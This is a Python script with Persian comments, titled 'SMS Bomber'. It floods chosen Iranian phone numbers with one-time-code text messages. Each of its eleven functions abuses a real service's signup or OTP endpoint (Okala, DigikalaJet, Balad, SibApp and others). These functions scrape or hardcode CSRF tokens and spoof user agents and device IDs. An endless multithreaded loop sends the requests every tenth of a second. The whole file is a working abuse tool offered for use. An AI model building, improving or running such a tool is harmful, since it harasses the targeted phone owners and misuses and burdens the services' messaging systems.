import requests
import re
import uuid
from threading import Thread
from time import sleep
import socket
import urllib3
import random

# غیرفعال کردن هشدارهای urllib3
urllib3.disable_warnings()

# تعریف user_agents
user_agents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0", 
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
]

# رنگ‌ها برای خروجی
r, g, y, a = '\033[31;1m', '\033[32;1m', '\033[33;1m', '\033[0m'

# ==========================
# بررسی اتصال اینترنت
# ==========================
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ==========================
# اعتبارسنجی شماره‌ها
# ==========================
def is_phone(phone_input: str):
    phones = phone_input.split('-')
    valid_phones = []
    for phone in phones:
        phone = phone.strip()
        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
        else:
            print(f"{r}[-] Invalid Phone: {phone}{a}")
    return valid_phones if valid_phones else False

# ==========================
# تابع ارسال ایمن
# ==========================
def send_service_safe(service, phone):
    try:
        result = service(phone)
        if result:
            print(f"{g}[+] {service.__name__}: Code Sent!{a}")
        else:
            print(f"{y}[-] {service.__name__}: Failed or No Response{a}")
    except Exception as e:
        print(f"{r}[!] Error in {service.__name__}: {e}{a}")

# ==========================
# توابع سرویس‌ها
# ==========================



def Shixon(phone):
    try:
        # استفاده از توکن و پارامترهای ثابت
        token = "Mo_RP1oxyr-1ZZH7yQIektMd6OSMi-ZNVBC6bQey-AK8qwzFRI6_9sEhaxPZCRSIqqX_YXGPwK_Ny2w-U08VwRY0fr4jNpDp1oUb9zNJSsA1"
        
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        payload = {
            "M": formatted_phone,
            "P": "password", 
            "s": "888",
            "PU": "",
            "__RequestVerificationToken": token
        }
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "text/html, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.shixon.com",
            "Referer": "https://www.shixon.com/Home/RegisterUser",
        }
        
        response = requests.post(
            "https://www.shixon.com/Home/RegisterUser",
            data=payload,
            headers=headers,
            timeout=10
        )
        
        print(f'{y}[Debug] Shixon Status: {response.status_code}{a}')
        
        # هر status code زیر 500 را موفقیت در نظر بگیریم
        if response.status_code < 500:
            print(f'{g}(Shixon) Request completed (Status: {response.status_code}){a}')
            return True
        else:
            print(f'{r}[-] Shixon Server Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Shixon Exception: {e}{a}')
        return False


def Charsooq(phone):
    try:
        url = "https://app.charsooq.com/api/v1/send-otp"
        
        # فرمت شماره: 09113339999 (با صفر اول)
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"  # مطمئن شویم که با صفر شروع می‌شود
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": random.choice(user_agents),
            "Origin": "https://app.charsooq.com",
            "Referer": "https://app.charsooq.com/",
        }
        
        payload = {
            "cell_number": formatted_phone  # با فرمت 09123334455
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] Charsooq Status: {response.status_code}{a}')
        print(f'{y}[Debug] Charsooq Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            print(f'{g}(Charsooq) Code Sent{a}')
            return True
        elif response.status_code == 422:
            print(f'{y}[!] Charsooq Validation Error{a}')
            return False
        else:
            print(f'{r}[-] Charsooq HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Charsooq Exception: {e}{a}')
        return False



def Koohshid(phone):
    try:
        session = requests.Session()
        
        # دریافت صفحه اصلی برای استخراج CSRF
        home_response = session.get(
            "https://koohshid.com/",
            headers={"User-Agent": random.choice(user_agents)},
            timeout=10
        )
        
        # استخراج CSRF از صفحه
        csrf_match = re.search(r'name="csrf" value="([^"]+)"', home_response.text)
        csrf = csrf_match.group(1) if csrf_match else "5282f04eb5"
        
        if not csrf:
            print(f'{r}[-] Koohshid: Could not extract CSRF token{a}')
            return False
        
        print(f'{g}[+] CSRF Token: {csrf}{a}')
        
        # آماده سازی payload
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": formatted_phone,
            "csrf": csrf,
            "login": "2",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "json": "1",
            "whatsapp": "0"
        }
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://koohshid.com",
            "Referer": "https://koohshid.com/",
        }
        
        response = session.post(
            "https://koohshid.com/wp-admin/admin-ajax.php",
            data=payload,
            headers=headers,
            timeout=10
        )
        
        print(f'{y}[Debug] Koohshid Status: {response.status_code}{a}')
        print(f'{y}[Debug] Koohshid Response: {response.text}{a}')
        
        if response.status_code == 200:
            try:
                data = response.json()
                if data.get("success") or "sent" in str(data).lower():
                    print(f'{g}(Koohshid) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] Koohshid Failed: {data.get("message", "Unknown")}{a}')
                    return False
            except:
                if "1" in response.text or "success" in response.text.lower():
                    print(f'{g}(Koohshid) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] Koohshid HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Koohshid Exception: {e}{a}')
        return False
        

def Okala(phone):
    try:
        url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
        
        # فرمت شماره
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "X-Correlation-Id": str(uuid.uuid4()),
            "session-id": str(uuid.uuid4()),
            "ui-version": "2.0",
            "source": "okala",
            "User-Agent": random.choice(user_agents),
            "Origin": "https://okala.com",
            "Referer": "https://okala.com/",
        }
        
        payload = {
            "mobile": formatted_phone,
            "confirmTerms": True,
            "notRobot": False,
            "ValidationCodeCreateReason": 5,
            "OtpApp": 0,
            "deviceTypeCode": 7,
            "IsAppOnly": False
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] Okala Status: {response.status_code}{a}')
        print(f'{y}[Debug] Okala Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("isSuccess") or data.get("otpSent"):
                    print(f'{g}(Okala) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] Okala Failed: {data.get("message", "Unknown error")}{a}')
                    return False
            except:
                if "success" in response.text.lower() or "otp" in response.text.lower():
                    print(f'{g}(Okala) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] Okala HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Okala Exception: {e}{a}')
        return False



def Besparto(phone):
    try:
        session = requests.Session()
        
        # اول صفحه اصلی را بگیریم تا توکن را استخراج کنیم
        home_response = session.get(
            "https://besparto.ir/",
            headers={"User-Agent": random.choice(user_agents)},
            timeout=10
        )
        
        # استخراج Client-Token از صفحه
        client_token = None
        token_patterns = [
            r'Client-Token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'clientToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'\$2y\$10\$[a-zA-Z0-9./]+'  # pattern برای توکن های bcrypt
        ]
        
        for pattern in token_patterns:
            match = re.search(pattern, home_response.text)
            if match:
                client_token = match.group(0)  # کل match را بگیریم
                print(f'{g}[+] Found Client-Token: {client_token}{a}')
                break
        
        if not client_token:
            # اگر توکن پیدا نشد، از توکن پیشفرض استفاده کنیم
            client_token = "$2y$10$KH69txfOkqZuhxqF2W1BR.6o0jrrw.X53TH4dMmYfhCDNtwwq/8n6"
            print(f'{y}[!] Using default Client-Token{a}')
        
        # حالا درخواست ارسال کد
        url = "https://api.besparto.ir/customer/v1/token/"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Client-Token": client_token,
            "User-Agent": random.choice(user_agents),
            "Origin": "https://besparto.ir",
            "Referer": "https://besparto.ir/",
        }
        
        payload = {
            "mobile": formatted_phone
        }
        
        response = session.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] Besparto Status: {response.status_code}{a}')
        print(f'{y}[Debug] Besparto Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("status") == "success":
                    print(f'{g}(Besparto) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] Besparto Failed: {data.get("message", "Unknown error")}{a}')
                    return False
            except:
                if "success" in response.text.lower() or "sent" in response.text.lower():
                    print(f'{g}(Besparto) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] Besparto HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Besparto Exception: {e}{a}')
        return False



def DigikalaJet(phone):
    try:
        url = "https://api.digikalajet.ir/user/login-register/"
        
        # فرمت شماره
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "X-Request-UUID": str(uuid.uuid4()),
            "ClientId": f"FINGERPRINT-{uuid.uuid4().hex[:20]}",
            "ClientOs": "iOS",
            "Client": "mobile",
            "product-mode": "shop_product",
            "session": f"{uuid.uuid4()}-V2{random.randint(1000000000, 9999999999)}",
            "app-id": str(uuid.uuid4()),
            "clientid-v2": f"FINGERPRINTV2-{uuid.uuid4().hex[:20]}",
            "User-Agent": random.choice(user_agents),
            "Origin": "https://digikalajet.ir",
            "Referer": "https://digikalajet.ir/",
        }
        
        payload = {
            "phone": formatted_phone
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] DigikalaJet Status: {response.status_code}{a}')
        print(f'{y}[Debug] DigikalaJet Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("status") == "success":
                    print(f'{g}(DigikalaJet) Code Sent{a}')
                    return True
                else:
                    print(f'{r}[-] DigikalaJet Failed: {data.get("message", "Unknown error")}{a}')
                    return False
            except:
                if "success" in response.text.lower() or "sent" in response.text.lower():
                    print(f'{g}(DigikalaJet) Code Sent{a}')
                    return True
                return False
        else:
            print(f'{r}[-] DigikalaJet HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] DigikalaJet Exception: {e}{a}')
        return False



def Sandalestan(phone):
    try:
        session = requests.Session()
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        # اول صفحه را بگیریم تا CSRF Token و fingerprint را دریافت کنیم
        url = f"https://sandalestan.com/register-opt?mobile={formatted_phone}"
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        
        # دریافت صفحه اول
        response = session.get(url, headers=headers, timeout=10)
        
        # استخراج CSRF Token
        csrf_token = None
        csrf_pattern = r'name="csrf-token" content="([^"]+)"'
        match = re.search(csrf_pattern, response.text)
        if match:
            csrf_token = match.group(1)
        
        if not csrf_token:
            print(f'{r}[-] Sandalestan: Could not extract CSRF Token{a}')
            return False
        
        # استخراج fingerprint از صفحه (اگر وجود دارد)
        fingerprint_id = f"fp{random.randint(100000, 999999)}"
        
        # آماده سازی payload برای Livewire
        payload = {
            "fingerprint": {
                "id": fingerprint_id,
                "name": "auth.register",
                "locale": "fa",
                "path": "register-opt",
                "method": "GET"
            },
            "serverMemo": {
                "children": [],
                "errors": [],
                "htmlHash": "7c608e69",
                "data": {
                    "name": None,
                    "password": None,
                    "password_confirmation": None,
                    "email": None,
                    "introducer_mobile": None,
                    "newsletter": 1,
                    "mobile": formatted_phone,
                    "code": None,
                    "step": 2,
                    "type_code": None,
                    "user": None
                },
                "dataMeta": [],
                "checksum": "e089e0c638f7d93a25a684677583a927f8e8af92fd12451b098269cae6685216"
            },
            "updates": [
                {
                    "type": "callMethod",
                    "payload": {
                        "method": "resend",
                        "params": []
                    }
                }
            ]
        }
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/json",
            "Accept": "text/html, application/xhtml+xml",
            "X-Livewire": "true",
            "X-CSRF-TOKEN": csrf_token,
            "Referer": f"https://sandalestan.com/register-opt?mobile={formatted_phone}",
            "Origin": "https://sandalestan.com"
        }
        
        # ارسال درخواست به Livewire
        response = session.post(
            "https://sandalestan.com/livewire/message/auth.register",
            json=payload,
            headers=headers,
            timeout=10
        )
        
        print(f'{y}[Debug] Sandalestan Status: {response.status_code}{a}')
        print(f'{y}[Debug] Sandalestan Response: {response.text[:200]}...{a}')
        
        if response.status_code == 200:
            print(f'{g}(Sandalestan) Code Sent{a}')
            return True
        else:
            print(f'{r}[-] Sandalestan HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Sandalestan Exception: {e}{a}')
        return False
        

def Footini(phone):
    try:
        session = requests.Session()
        
        # دریافت صفحه اصلی برای استخراج instance_id و digits_form
        home_response = session.get(
            "https://footini.ir/product-category/sandal/?login=true&page=1",
            headers={"User-Agent": random.choice(user_agents)},
            timeout=10
        )
        
        # استخراج instance_id و digits_form از صفحه
        instance_id_match = re.search(r'name="instance_id" value="([^"]+)"', home_response.text)
        digits_form_match = re.search(r'name="digits_form" value="([^"]+)"', home_response.text)
        
        instance_id = instance_id_match.group(1) if instance_id_match else "de6bca2e4448c81c7733fa67a04f5594"
        digits_form = digits_form_match.group(1) if digits_form_match else "09819c58fd"
        
        print(f'{g}[+] Instance ID: {instance_id}, Digits Form: {digits_form}{a}')
        
        # آماده سازی payload
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        
        payload = {
            "digt_countrycode": "+98",
            "phone": formatted_phone,
            "digits_reg_name": "نام",
            "digits_reg_username": f"user{random.randint(10000, 99999)}",
            "digits_reg_password": f"Pass{random.randint(1000, 9999)}",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "instance_id": instance_id,
            "optional_data": "optional_data",
            "action": "digits_forms_ajax",
            "type": "register",
            "dig_otp": "otp",
            "digits": "1",
            "digits_redirect_page": "https://footini.ir/product-category/sandal/",
            "digits_form": digits_form,
            "_wp_http_referer": "/product-category/sandal/?login=true&page=1",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://footini.ir",
            "Referer": "https://footini.ir/product-category/sandal/?login=true&page=1",
        }
        
        response = session.post(
            "https://footini.ir/wp-admin/admin-ajax.php",
            data=payload,
            headers=headers,
            timeout=10
        )
        
        print(f'{y}[Debug] Footini Status: {response.status_code}{a}')
        print(f'{y}[Debug] Footini Response: {response.text}{a}')
        
        if response.status_code == 200:
            try:
                data = response.json()
                if data.get("success") or "otp" in str(data).lower():
                    print(f'{g}(Footini) Code Sent{a}')
                    return True
            except:
                if "1" in response.text or "success" in response.text.lower():
                    print(f'{g}(Footini) Code Sent{a}')
                    return True
        elif response.status_code == 400:
            print(f'{r}[-] Footini Bad Request{a}')
            return False
        
        return False
            
    except Exception as e:
        print(f'{r}[!] Footini Exception: {e}{a}')
        return False



def ShahreSandal(phone):
    try:
        session = requests.Session()
        
        # ابتدا صفحه اصلی را برای دریافت CSRF Token بگیریم
        home_response = session.get(
            "https://shahresandal.com/",
            headers={"User-Agent": random.choice(user_agents)},
            timeout=10
        )
        
        # استخراج CSRF Token از صفحه
        csrf_token = None
        csrf_patterns = [
            r'name="csrf-token" content="([^"]+)"',
            r'X-CSRF-TOKEN["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'csrfToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in csrf_patterns:
            match = re.search(pattern, home_response.text)
            if match:
                csrf_token = match.group(1)
                break
        
        if not csrf_token:
            print(f'{r}[-] ShahreSandal: Could not extract CSRF Token{a}')
            return False
        
        print(f'{g}[+] CSRF Token: {csrf_token}{a}')
        
        # حالا درخواست ارسال کد
        url = "https://shahresandal.com/sendcode"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-CSRF-Token": csrf_token,
            "User-Agent": random.choice(user_agents),
            "Origin": "https://shahresandal.com",
            "Referer": "https://shahresandal.com/",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        payload = {
            "mobile": formatted_phone
        }
        
        response = session.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] ShahreSandal Status: {response.status_code}{a}')
        print(f'{y}[Debug] ShahreSandal Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("success") or data.get("status") == "success":
                    print(f'{g}(ShahreSandal) Code Sent{a}')
                    return True
            except:
                if "success" in response.text.lower():
                    print(f'{g}(ShahreSandal) Code Sent{a}')
                    return True
        elif response.status_code == 419:
            print(f'{r}[-] ShahreSandal: CSRF Token Expired/Invalid{a}')
            return False
        
        return False
            
    except Exception as e:
        print(f'{r}[!] ShahreSandal Exception: {e}{a}')
        return False


def SibApp(phone):
    try:
        url = "https://api.sibapp.net/api/v1/action"
        
        # فرمت شماره
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json; charset=UTF-8",
            "Cache-Control": "no-cache",
            "User-Agent": random.choice(user_agents),
            "Origin": "https://sibapp.net",
            "Referer": "https://sibapp.net/",
        }
        
        # ایجاد UUID یکتا برای هر درخواست
        user_unique_id = str(uuid.uuid4())
        
        payload = {
            "name": "phone_number_verify",
            "data": {
                "utm": {
                    "source": "google",
                    "medium": "organic",
                    "campaign": ""
                },
                "user_unique_id": user_unique_id,
                "purchase_flow": "",
                "purchase_flow_version": "purchaseFlowABGroup",
                "package_a_b_group": None,
                "package_a_b_group_version": "packagesABGroupV11",
                "register_a_b_group": "c",
                "register_a_b_group_version": "registerABGroupV3",
                "phone_number": formatted_phone  # اضافه کردن شماره تلفن
            }
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10
        )
        
        print(f'{y}[Debug] SibApp Status: {response.status_code}{a}')
        print(f'{y}[Debug] SibApp Response: {response.text}{a}')
        
        if response.status_code in [200, 201, 202]:
            try:
                data = response.json()
                if data.get("name") == "phone_number_verify":
                    print(f'{g}(SibApp) Code Sent{a}')
                    return True
            except:
                if "phone_number_verify" in response.text:
                    print(f'{g}(SibApp) Code Sent{a}')
                    return True
        elif response.status_code == 400:
            print(f'{r}[-] SibApp Bad Request{a}')
            return False
        else:
            print(f'{r}[-] SibApp HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] SibApp Exception: {e}{a}')
        return False



def Balad(phone):
    try:
        formatted_phone = "0" + phone.replace("+98", "")  # تبدیل +989... به 09...
        
        url = "https://account.api.balad.ir/api/web/auth/login/"
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "device-id": str(uuid.uuid4()),
            "User-Agent": random.choice(user_agents)
        }
        
        payload = {
            "phone_number": formatted_phone,
            "os_type": "W"
        }
        
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(Balad) Code Sent{a}')
            return True
        else:
            print(f'{r}[-] Balad HTTP Error: {response.status_code} - {response.text[:100]}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] Balad Exception: {e}{a}')
        return False


def nillarayeshi(phone):
    try:
        formatted_phone = "0" + phone.replace("+98", "")
        
        # استفاده از مقادیر ثابت از درخواست واقعی
        csrf = "2a49f89a8f"
        nonce = "2a49f89a8f"
        
        url = "https://nillarayeshi.com/wp-admin/admin-ajax.php"
        
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": formatted_phone,
            "csrf": csrf,
            "login": "2",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "digits": "1",
            "json": "1",
            "whatsapp": "0",
            "digits_reg_name": "نام",
            "digregcode": "+98",
            "digits_reg_mail": formatted_phone,
            "digregscode2": "+98",
            "mobmail2": "",
            "digits_reg_password": "",
            "dig_otp": "",
            "code": "",
            "dig_reg_mail": "",
            "dig_nounce": nonce
        }
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://nillarayeshi.com",
            "Referer": "https://nillarayeshi.com/",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
        }
        
        response = requests.post(url, data=payload, headers=headers, timeout=15)
        
        print(f'{y}[Debug] Status: {response.status_code}{a}')
        print(f'{y}[Debug] Response: {response.text}{a}')
        
        if response.status_code == 200:
            if response.text.strip() == "1" or "success" in response.text.lower():
                print(f'{g}(nillarayeshi) Code Sent{a}')
                return True
            else:
                print(f'{r}[-] nillarayeshi: Server returned {response.text}{a}')
                return False
        else:
            print(f'{r}[-] nillarayeshi: HTTP Error {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f"{r}[!] nillarayeshi Exception: {e}{a}")
        return False

        
# ==========================
# لیست سرویس‌ها
# ==========================
services = [Balad, Besparto, Charsooq, DigikalaJet, Footini, Koohshid, nillarayeshi, Okala, ShahreSandal, Shixon, SibApp]

# ==========================
# تابع VIP مولتی‌تردینگ
# ==========================
def vip(phones, delay=0.1):
    print(f"{g}Targets: {y}{', '.join(phones)}{a}")
    print(f"{g}Services Loaded: {y}{len(services)}{a}")
    print(f"{g}Delay: {y}{delay}s{a}")
    print(f"{y}══════════════════════════════════════════════{a}")
    
    try:
        while True:
            for phone in phones:
                for service in services:
                    Thread(target=send_service_safe, args=(service, phone)).start()
                    sleep(delay)
    except KeyboardInterrupt:
        print(f"{g}[+] Mission Completed!{a}")

# ==========================
# منوی اصلی
# ==========================
def main_menu():
    print(f"""
{y}╔════════════════════════════════════════════╗
{g}║                SMS Bomber                 ║
{y}╚════════════════════════════════════════════╝
{g} Services Loaded: {y}{len(services)}{a}
{y}══════════════════════════════════════════════
{g} Enter phone numbers (separated by - for multiple):
{a} Example: +989123456789-+989987654321
{y}══════════════════════════════════════════════
""")

# ==========================
# نقطه ورود
# ==========================
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection!{a}")
    else:
        main_menu()
        phones = None
        while not phones:
            phone_input = input(f'{g}[?] Enter Phone(s) (+98): {a}')
            phones = is_phone(phone_input)
            if not phones:
                print(f"{r}[-] No valid phones entered!{a}")
        try:
            delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
        except ValueError:
            delay = 0.1
        vip(phones, delay)
